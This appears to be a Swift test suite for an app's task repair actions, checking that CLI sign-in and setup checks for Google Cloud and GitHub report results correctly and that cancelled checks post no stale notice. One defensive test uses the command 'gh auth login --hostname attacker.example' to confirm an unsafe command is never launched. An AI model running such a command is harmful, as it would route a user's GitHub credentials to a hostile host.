import Foundation
import Testing
import ASTRACore
import ASTRAModels
@testable import ASTRA

@MainActor
@Suite("Task repair actions")
struct TaskRepairActionTests {
    @Test("Check verifies the manual context and reports its result without launching or resuming", arguments: [false, true])
    func manualCheckHasAVisibleResult(passed: Bool) async {
        let environment = ["CLOUDSDK_CONFIG": "/tmp/task-config"]
        let repair = CLISessionExpiryClassifier.googleCloud.repair.checking(in: environment)
            .targetingCredentialStore(environment)
        var checked: [RepairAction] = []
        let guidance = await TaskRepairAction.perform(repair, check: { checked.append($0); return passed },
            run: { _ in Issue.record("Manual setup cannot launch an external action") })
        #expect(checked.count == 1)
        #expect(checked.first?.checkEnvironment == environment)
        #expect(guidance?.title == (passed ? "Setup check passed" : "Setup needs attention"))
        #expect(guidance?.detail.contains("Resume") == true)
    }

    @Test("An admitted sign-in launches once and does not claim it passed verification")
    func automaticSignInKeepsItsSeparateResumeStep() async {
        let repair = CLISessionExpiryClassifier.googleCloud.repair
        var launched: [RepairAction] = []
        let guidance = await TaskRepairAction.perform(repair,
            check: { _ in Issue.record("An external sign-in has not finished yet"); return true }, run: { launched.append($0) })
        #expect(launched == [repair])
        #expect(guidance == nil)
    }

    @Test("A rejected old command is checked as manual setup and never launched")
    func oldUnsafeCommandGetsVisibleManualSetup() async {
        let repair = RepairAction(strategy: .terminal, componentName: "GitHub", title: "Sign in", verb: "Sign in", detail: "",
            command: "gh auth login --hostname attacker.example", checkBinary: "gh", checkArguments: ["auth", "status"])
        var checked = false
        let guidance = await TaskRepairAction.perform(repair, check: { candidate in
            checked = true
            #expect(candidate.command == nil)
            return false
        }, run: { _ in Issue.record("A rejected command cannot reach Terminal") })
        #expect(checked)
        #expect(guidance?.title == "Setup needs attention")
    }

    @Test("A cancelled presentation cannot display a late check result for another run")
    func cancelledActionDoesNotPublishALateNotice() async {
        let task = AgentTask(title: "Check", goal: "Check setup")
        var release: CheckedContinuation<TaskRepairAction.Guidance?, Never>?
        let presentation = TaskRepairActionPresentation(resolve: { _, _, _ in nil }, perform: { _ in
            await withCheckedContinuation { release = $0 }
        })
        let action = presentation.start(events: [], runID: UUID(), task: task)
        for _ in 0..<100 where release == nil { await Task.yield() }
        guard let release else { presentation.cancel(); Issue.record("The check did not reach its controlled completion"); return }
        presentation.cancel()
        release.resume(returning: .init(title: "Old result", detail: "Old run"))
        await action.value
        #expect(presentation.notice == nil)
    }
}
